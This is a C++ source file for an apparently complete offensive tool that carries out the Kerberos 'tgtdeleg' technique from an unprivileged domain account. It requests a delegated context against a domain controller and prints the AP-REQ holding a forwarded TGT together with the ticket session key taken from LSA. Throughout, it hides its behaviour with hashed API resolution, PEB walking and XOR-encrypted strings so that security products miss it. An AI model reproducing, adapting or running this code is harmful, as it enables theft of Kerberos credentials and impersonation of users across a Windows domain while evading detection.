// Cross-session TGT extraction via Kerberos delegation
// Runs as regular domain user, no elevation needed
//
// Compile: x86_64-w64-mingw32-g++ -O2 -s -static tgtdeleg.cpp -o tgtdeleg.exe

#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <ntsecapi.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <string>
#include <vector>
#include <array>
#include <utility>
#include <cstddef>

// --- API Hashing Constants ---
#define HASH_LoadLibraryA 0xbfad0e5f5fbff0fb
#define HASH_GetProcAddress 0x996ed96fcf31bb1f
#define HASH_CloseHandle 0xbfcc17c63870ca07
#define HASH_GetLastError 0xbbf7d9fd2082eae3
#define HASH_MultiByteToWideChar 0x751847bae2fdda8e
#define HASH_GetComputerNameExW 0xe0e03d85d252a609
#define HASH_GetEnvironmentVariableA 0x43b05be787889701

// NetAPI32 (DsGetDcName)
#define HASH_DsGetDcNameA 0xba220d4cc2e9a885
#define HASH_NetApiBufferFree 0x678ff64a083e6be2

// SSPI & LSA
#define HASH_AcquireCredentialsHandleW 0x2437211d3a1007a0
#define HASH_InitializeSecurityContextW 0xde3ef1894b4f0e4b
#define HASH_FreeContextBuffer 0x4791334333cef346
#define HASH_LsaConnectUntrusted 0xbdffccf1b851157d
#define HASH_LsaLookupAuthenticationPackage 0xfa10e718f0fc4b4b
#define HASH_LsaCallAuthenticationPackage 0x124b47e5abc4bb2d
#define HASH_LsaFreeReturnBuffer 0x4dbfbbf6528ffd01
#define HASH_LsaDeregisterLogonProcess 0x2af079e223961991

// --- Typedefs ---
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef DWORD (WINAPI *pGetLastError)();
typedef int (WINAPI *pMultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef BOOL (WINAPI *pGetComputerNameExW)(COMPUTER_NAME_FORMAT, LPWSTR, LPDWORD);
typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);

// DOMAIN_CONTROLLER_INFO structure for DsGetDcNameA
typedef struct _DOMAIN_CONTROLLER_INFOA {
    LPSTR DomainControllerName;
    LPSTR DomainControllerAddress;
    ULONG DomainControllerAddressType;
    GUID  DomainGuid;
    LPSTR DomainName;
    LPSTR DnsForestName;
    ULONG Flags;
    LPSTR DcSiteName;
    LPSTR ClientSiteName;
} DOMAIN_CONTROLLER_INFOA, *PDOMAIN_CONTROLLER_INFOA;

typedef DWORD (WINAPI *pDsGetDcNameA)(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);
typedef DWORD (WINAPI *pNetApiBufferFree)(LPVOID);

// SSPI & LSA Typedefs
typedef SECURITY_STATUS (WINAPI *pAcquireCredentialsHandleW)(SEC_WCHAR*, SEC_WCHAR*, ULONG, PLUID, PVOID, SEC_GET_KEY_FN, PVOID, PCredHandle, PTimeStamp);
typedef SECURITY_STATUS (WINAPI *pInitializeSecurityContextW)(PCredHandle, PCtxtHandle, SEC_WCHAR*, ULONG, ULONG, ULONG, PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
typedef SECURITY_STATUS (WINAPI *pFreeContextBuffer)(PVOID);

typedef NTSTATUS (WINAPI *pLsaConnectUntrusted)(PHANDLE);
typedef NTSTATUS (WINAPI *pLsaLookupAuthenticationPackage)(HANDLE, PLSA_STRING, PULONG);
typedef NTSTATUS (WINAPI *pLsaCallAuthenticationPackage)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS (WINAPI *pLsaFreeReturnBuffer)(PVOID);
typedef NTSTATUS (WINAPI *pLsaDeregisterLogonProcess)(HANDLE);

// --- Stealth Class ---
typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

class Stealth {
private:
    static uint64_t HashString(const char* str) {
        uint64_t hash = 5381;
        int c;
        while ((c = *str++))
            hash = ((hash << 5) + hash) + c;
        return hash;
    }

    static HMODULE GetModuleByHash(uint64_t hash) {
#ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
#else
        PPEB peb = (PPEB)__readfsdword(0x30);
#endif
        PPEB_LDR_DATA ldr = peb->Ldr;
        PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        while (curr != head) {
            PMY_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            
            if (entry->BaseDllName.Buffer) {
                char dllName[256];
                int i = 0;
                for (i = 0; i < entry->BaseDllName.Length / 2 && i < 255; i++) {
                    char c = (char)entry->BaseDllName.Buffer[i];
                    if (c >= 'A' && c <= 'Z') c += 32;
                    dllName[i] = c;
                }
                dllName[i] = 0;

                if (HashString(dllName) == hash) {
                    return (HMODULE)entry->DllBase;
                }
            }
            curr = curr->Flink;
        }
        return NULL;
    }
    
public:
    static FARPROC GetProcAddressH(HMODULE hMod, uint64_t apiHash) {
        if (!hMod) return NULL;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);

        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            char* name = (char*)((BYTE*)hMod + names[i]);
            if (HashString(name) == apiHash) {
                return (FARPROC)((BYTE*)hMod + functions[ordinals[i]]);
            }
        }
        return NULL;
    }

    static HMODULE LoadLibraryH(const char* dllName, uint64_t dllHash) {
        HMODULE h = GetModuleByHash(dllHash);
        if (h) return h;
        
        HMODULE hKernel = GetModuleByHash(0xd537e9367040ee75); 
        if (!hKernel) return NULL;
        
        pLoadLibraryA myLoadLibraryA = (pLoadLibraryA)GetProcAddressH(hKernel, HASH_LoadLibraryA);
        if (myLoadLibraryA) return myLoadLibraryA(dllName);
        
        return NULL;
    }
};

// --- String Encryption ---
constexpr char KEY = 0x55;

template <size_t N, size_t... Is>
constexpr auto encrypt(const char (&str)[N], std::index_sequence<Is...>) {
    return std::array<char, N>{ (static_cast<char>(str[Is] ^ KEY))... };
}

template <size_t N>
struct XorStr {
    std::array<char, N> data;

    constexpr XorStr(const char (&str)[N]) 
        : data(encrypt(str, std::make_index_sequence<N>{})) {}

    __declspec(noinline) void decrypt(char* out) const {
        for (size_t i = 0; i < N; ++i) {
            out[i] = data[i] ^ KEY;
        }
    }
};

#define DECRYPT(v, str) \
    constexpr auto _crypt_##v = XorStr<sizeof(str)>(str); \
    char v[sizeof(str)]; \
    _crypt_##v.decrypt(v);

// --- Global Function Pointers ---
pCloseHandle p_CloseHandle = NULL;
pGetLastError p_GetLastError = NULL;
pMultiByteToWideChar p_MultiByteToWideChar = NULL;
pGetComputerNameExW p_GetComputerNameExW = NULL;
pGetEnvironmentVariableA p_GetEnvironmentVariableA = NULL;
pDsGetDcNameA p_DsGetDcNameA = NULL;
pNetApiBufferFree p_NetApiBufferFree = NULL;

pAcquireCredentialsHandleW p_AcquireCredentialsHandleW = NULL;
pInitializeSecurityContextW p_InitializeSecurityContextW = NULL;
pFreeContextBuffer p_FreeContextBuffer = NULL;

pLsaConnectUntrusted p_LsaConnectUntrusted = NULL;
pLsaLookupAuthenticationPackage p_LsaLookupAuthenticationPackage = NULL;
pLsaCallAuthenticationPackage p_LsaCallAuthenticationPackage = NULL;
pLsaFreeReturnBuffer p_LsaFreeReturnBuffer = NULL;
pLsaDeregisterLogonProcess p_LsaDeregisterLogonProcess = NULL;

BOOL InitAPIs() {
    DECRYPT(sK32, "kernel32.dll");
    HMODULE hK32 = Stealth::LoadLibraryH(sK32, 0xd537e9367040ee75);
    
    DECRYPT(sSspi, "sspicli.dll");
    HMODULE hSspi = Stealth::LoadLibraryH(sSspi, 0xc0d26e5d4a79c746);

    if (!hK32 || !hSspi) {
        return FALSE;
    }

    p_CloseHandle = (pCloseHandle)Stealth::GetProcAddressH(hK32, HASH_CloseHandle);
    p_GetLastError = (pGetLastError)Stealth::GetProcAddressH(hK32, HASH_GetLastError);
    p_MultiByteToWideChar = (pMultiByteToWideChar)Stealth::GetProcAddressH(hK32, HASH_MultiByteToWideChar);
    p_GetComputerNameExW = (pGetComputerNameExW)Stealth::GetProcAddressH(hK32, HASH_GetComputerNameExW);
    p_GetEnvironmentVariableA = (pGetEnvironmentVariableA)Stealth::GetProcAddressH(hK32, HASH_GetEnvironmentVariableA);

    // SSPI - Resolve from sspicli.dll to avoid forwarders
    p_AcquireCredentialsHandleW = (pAcquireCredentialsHandleW)Stealth::GetProcAddressH(hSspi, HASH_AcquireCredentialsHandleW);
    p_InitializeSecurityContextW = (pInitializeSecurityContextW)Stealth::GetProcAddressH(hSspi, HASH_InitializeSecurityContextW);
    p_FreeContextBuffer = (pFreeContextBuffer)Stealth::GetProcAddressH(hSspi, HASH_FreeContextBuffer);

    // LSA
    p_LsaConnectUntrusted = (pLsaConnectUntrusted)Stealth::GetProcAddressH(hSspi, HASH_LsaConnectUntrusted);
    p_LsaLookupAuthenticationPackage = (pLsaLookupAuthenticationPackage)Stealth::GetProcAddressH(hSspi, HASH_LsaLookupAuthenticationPackage);
    p_LsaCallAuthenticationPackage = (pLsaCallAuthenticationPackage)Stealth::GetProcAddressH(hSspi, HASH_LsaCallAuthenticationPackage);
    p_LsaFreeReturnBuffer = (pLsaFreeReturnBuffer)Stealth::GetProcAddressH(hSspi, HASH_LsaFreeReturnBuffer);
    p_LsaDeregisterLogonProcess = (pLsaDeregisterLogonProcess)Stealth::GetProcAddressH(hSspi, HASH_LsaDeregisterLogonProcess);

    if (!p_AcquireCredentialsHandleW || !p_InitializeSecurityContextW || !p_LsaConnectUntrusted || !p_GetEnvironmentVariableA) {
         return FALSE;
    }
    return TRUE;
}

// --- Helper Functions ---
void PrintHex(const unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        printf("%02X", data[i]);
    }
    printf("\n");
}

std::string GetTargetSPN(const char* userTarget) {
    if (userTarget) {
        return std::string(userTarget);
    }
    
    // Use environment variables to construct DC SPN
    // LOGONSERVER = \\DCNAME (NetBIOS)
    // USERDNSDOMAIN = domain.com
    
    char logonServer[256] = {0};
    char dnsDomain[256] = {0};
    
    // Get LOGONSERVER (e.g., "\\SENTINEL-LAB-DC")
    DECRYPT(sLogonServer, "LOGONSERVER");
    DWORD len = p_GetEnvironmentVariableA(sLogonServer, logonServer, sizeof(logonServer));
    if (len == 0 || len >= sizeof(logonServer)) {
        fprintf(stderr, "[-] Failed to get env1\n");
        return "";
    }
    
    // Get USERDNSDOMAIN (e.g., "sentinel.lab")
    DECRYPT(sDnsDomain, "USERDNSDOMAIN");
    len = p_GetEnvironmentVariableA(sDnsDomain, dnsDomain, sizeof(dnsDomain));
    if (len == 0 || len >= sizeof(dnsDomain)) {
        fprintf(stderr, "[-] Failed to get env2\n");
        return "";
    }
    
    // Strip leading backslashes from LOGONSERVER
    const char* dcName = logonServer;
    while (*dcName == '\\') dcName++;
    
    // Convert to lowercase for the FQDN
    std::string dcLower;
    for (const char* p = dcName; *p; ++p) {
        dcLower += (*p >= 'A' && *p <= 'Z') ? (*p + 32) : *p;
    }
    
    // Construct FQDN: DCNAME.domain.com
    std::string dcFqdn = dcLower + "." + std::string(dnsDomain);
    
    return "HOST/" + dcFqdn;
}

// --- Core TGTDeleg Logic ---
int RunTgtDeleg(const std::string& target) {
    DECRYPT(pkgKerb, "Kerberos");
    
    // Convert package name to wide
    WCHAR wPkg[32];
    p_MultiByteToWideChar(CP_UTF8, 0, pkgKerb, -1, wPkg, 32);
    
    // === Step 1: Acquire Credentials Handle ===
    CredHandle hCred;
    TimeStamp ptsExpiry;
    
    SECURITY_STATUS status = p_AcquireCredentialsHandleW(
        NULL, 
        (SEC_WCHAR*)wPkg, 
        SECPKG_CRED_OUTBOUND, 
        NULL, NULL, NULL, NULL, 
        &hCred, 
        &ptsExpiry
    );

    if (status != SEC_E_OK) {
        fprintf(stderr, "[-] Cred failed: 0x%08X\n", status);
        return 1;
    }

    // === Step 2: Initialize Security Context (trigger delegation) ===
    CtxtHandle hCtx;
    SecBufferDesc sbdOut;
    SecBuffer sbOut;
    ULONG fContextAttr;
    
    // Convert target to Wide
    WCHAR wTarget[512];
    p_MultiByteToWideChar(CP_UTF8, 0, target.c_str(), -1, wTarget, 512);

    char buffer[16384];
    sbOut.BufferType = SECBUFFER_TOKEN;
    sbOut.cbBuffer = sizeof(buffer);
    sbOut.pvBuffer = buffer;

    sbdOut.ulVersion = SECBUFFER_VERSION;
    sbdOut.cBuffers = 1;
    sbdOut.pBuffers = &sbOut;

    // Request delegation - this is the key!
    ULONG fContextReq = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY; 
    
    status = p_InitializeSecurityContextW(
        &hCred, 
        NULL, 
        (SEC_WCHAR*)wTarget, 
        fContextReq, 
        0, 
        SECURITY_NATIVE_DREP, 
        NULL, 
        0, 
        &hCtx, 
        &sbdOut, 
        &fContextAttr, 
        &ptsExpiry
    );

    if (status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {
        fprintf(stderr, "[-] ISC failed: 0x%08X\n", status);
        return 1;
    }
    
    // === Step 3: Output AP-REQ ===
    printf("[AP-REQ]\n");
    PrintHex((unsigned char*)sbOut.pvBuffer, sbOut.cbBuffer);
    printf("\n");
    
    // === Step 4: Connect to LSA (untrusted = no elevation needed) ===
    HANDLE hLsa;
    NTSTATUS ntStatus = p_LsaConnectUntrusted(&hLsa);
    if (ntStatus != 0) {
        fprintf(stderr, "[-] Connect failed: 0x%08X\n", ntStatus);
        return 1;
    }
    
    LSA_STRING name;
    name.Buffer = pkgKerb;
    name.Length = strlen(pkgKerb);
    name.MaximumLength = name.Length + 1;
    
    ULONG authPkgId;
    ntStatus = p_LsaLookupAuthenticationPackage(hLsa, &name, &authPkgId);
    if (ntStatus != 0) {
        fprintf(stderr, "[-] Lookup failed: 0x%08X\n", ntStatus);
        return 1;
    }
    
    // === Step 5: Retrieve Session Key ===
    DWORD reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(wTarget) * sizeof(WCHAR));
    BYTE requestBuffer[2048];
    PKERB_RETRIEVE_TKT_REQUEST pReq = (PKERB_RETRIEVE_TKT_REQUEST)requestBuffer;
    memset(requestBuffer, 0, reqSize);
    
    pReq->MessageType = KerbRetrieveEncodedTicketMessage; 
    pReq->CacheOptions = 0;
    pReq->EncryptionType = 0;
    pReq->TargetName.Length = wcslen(wTarget) * sizeof(WCHAR);
    pReq->TargetName.MaximumLength = pReq->TargetName.Length;
    pReq->TargetName.Buffer = (PWSTR)(pReq + 1);
    memcpy(pReq->TargetName.Buffer, wTarget, pReq->TargetName.Length);
    
    PVOID pResponse = NULL;
    ULONG responseSize = 0;
    NTSTATUS protocolStatus;
    
    ntStatus = p_LsaCallAuthenticationPackage(
        hLsa, 
        authPkgId, 
        pReq, 
        reqSize, 
        &pResponse, 
        &responseSize, 
        &protocolStatus
    );
    
    if (ntStatus != 0 || protocolStatus != 0) {
        fprintf(stderr, "[-] Call failed. NT: 0x%08X, PS: 0x%08X\n", ntStatus, protocolStatus);
    } else {
        PKERB_RETRIEVE_TKT_RESPONSE pResp = (PKERB_RETRIEVE_TKT_RESPONSE)pResponse;
        
        if (pResp && pResp->Ticket.SessionKey.Value) {
            printf("[Session Key]\n");
            PrintHex(pResp->Ticket.SessionKey.Value, pResp->Ticket.SessionKey.Length);
            printf("\n");
        } else {
            fprintf(stderr, "[-] No Session Key in response.\n");
        }
        
        if (pResponse) {
             p_LsaFreeReturnBuffer(pResponse);
        }
    }
    
    p_LsaDeregisterLogonProcess(hLsa);

    if (sbOut.pvBuffer && (fContextReq & ISC_REQ_ALLOCATE_MEMORY)) {
         p_FreeContextBuffer(sbOut.pvBuffer);
    }
    
    return 0;
}

// --- Main ---
int main(int argc, char* argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (!InitAPIs()) {
        fprintf(stderr, "[-] Init failed\n");
        return 1;
    }

    const char* userTarget = nullptr;
    
    DECRYPT(flagT, "-t");
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], flagT) == 0 && i + 1 < argc) {
            userTarget = argv[++i];
        }
    }
    
    std::string target = GetTargetSPN(userTarget);
    if (target.empty()) {
        fprintf(stderr, "[-] No target. Use -t HOST/target.domain.com\n");
        fprintf(stderr, "Usage: %s [-t HOST/target.domain.com]\n", argv[0]);
        return 1;
    }
    
    fprintf(stderr, "[*] Target SPN: %s\n", target.c_str());
    
    return RunTgtDeleg(target);
}
